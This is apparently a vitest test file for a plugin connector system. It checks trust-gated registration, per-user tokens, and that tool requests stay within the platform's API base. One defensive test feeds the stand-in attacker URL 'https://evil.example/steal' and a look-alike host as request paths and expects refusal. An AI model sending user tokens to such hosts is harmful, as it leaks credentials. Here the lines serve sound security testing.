import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { callTool, issueToolToken, toolContextForToken } from "../src/agents/tools.ts";
import { featuresOf } from "../src/auth/features.ts";
import { loginProvider, setAuthFetchForTests } from "../src/auth/providers.ts";
import { storeConnection } from "../src/auth/vault.ts";
import { createUser } from "../src/core/users.ts";
import { describePlugin, getPlugin, loadPlugins, trustPlugin, untrustPlugin } from "../src/plugins/registry.ts";
import { testApp } from "./helpers.ts";

/**
 * A plugin brings a platform to connect (docs/v2/multi-user.md, “插件扩展”): its provider and features
 * register with its code, its tools call the platform as the person using them, and only at its API.
 */
describe("plugin connectors", async () => {
  const app = testApp();
  const dir = join(app.home, "plugins", "demo");
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "plugin.yaml"), ["id: demo", "name: 示例", "connectors:", "  - { provider: demo-api, features: [read] }", "permissions: { connectors: [demo-api] }"].join("\n"));
  writeFileSync(
    join(dir, "server.mjs"),
    `export default function register(api) {
  api.connector({
    id: "demo-api", label: "示例平台", channel: "demo", apiBase: "https://api.example.test/v1",
    unavailable: () => null,
    authorizeUrl: (_app, p) => "https://auth.example.test/authorize?state=" + p.state + "&scope=" + encodeURIComponent(p.scopes.join(" ")),
    exchange: async (_app, p) => ({ accessToken: "tok_" + p.code, scope: "read" }),
    whoami: async (_app, t) => ({ externalId: t.accessToken, name: "示例用户" }),
    features: [{ id: "read", label: "读", description: "读你的数据", scopes: ["read"] }],
  });
  api.tool({ name: "demo_me", description: "我是谁", schema: api.z.object({ path: api.z.string().default("/me") }), handler: async (ctx, a) => {
    const c = await ctx.connection("demo-api");
    if (!c) return "未连接";
    const r = await c.fetch(a.path);
    return c.account + "：" + (await r.text());
  } });
}
`,
  );
  const seen: { url: string; auth: string | null }[] = [];
  setAuthFetchForTests((async (url: string | URL | Request, init?: RequestInit) => {
    seen.push({ url: String(url), auth: new Headers(init?.headers).get("authorization") });
    return new Response("小安的数据");
  }) as typeof fetch);
  afterAll(() => setAuthFetchForTests(null));
  await loadPlugins(app, [{ dir: join(app.home, "plugins"), source: "data" }]);

  it("registers its provider and features only once its code is trusted", async () => {
    expect(loginProvider("demo-api")).toBeNull();
    await trustPlugin(app, "demo", "inprocess");
    expect(loginProvider("demo-api")?.label).toBe("示例平台");
    expect(featuresOf("demo-api").map((f) => f.id)).toEqual(["read"]);
    expect(describePlugin(getPlugin("demo")).connectors).toEqual([{ provider: "demo-api", features: ["read"] }]);
  });

  it("calls the platform as the person using the tool, at its API only", async () => {
    createUser(app, { name: "小安", id: "ann" });
    const ctx = (user: string) => toolContextForToken(app, issueToolToken({ runId: null, spaceId: `personal-${user}`, spaces: null, tools: null, actor: "agent", userId: user }))!;
    expect((await callTool(ctx("ann"), "demo_me", {})).text).toBe("未连接");
    storeConnection(app, { userId: "ann", provider: "demo-api", accountId: "a1", accountName: "小安在示例平台", scopes: ["read"], accessToken: "tok_ann", expiresIn: 3600 });
    expect((await callTool(ctx("ann"), "demo_me", {})).text).toBe("小安在示例平台：小安的数据");
    expect(seen.at(-1)).toEqual({ url: "https://api.example.test/v1/me", auth: "Bearer tok_ann" });
    // Somewhere else: the token is not sent.
    const n = seen.length;
    expect((await callTool(ctx("ann"), "demo_me", { path: "https://evil.example/steal" })).text).toMatch(/只能请求/);
    expect((await callTool(ctx("ann"), "demo_me", { path: "https://api.example.test/v1evil" })).text).toMatch(/只能请求/);
    expect(seen.length).toBe(n);
    // Someone else's connection is not theirs.
    createUser(app, { name: "小陈", id: "chen" });
    expect((await callTool(ctx("chen"), "demo_me", {})).text).toBe("未连接");
  });

  it("takes them away with its code", () => {
    untrustPlugin(app, "demo");
    expect(loginProvider("demo-api")).toBeNull();
    expect(featuresOf("demo-api")).toEqual([]);
  });
});
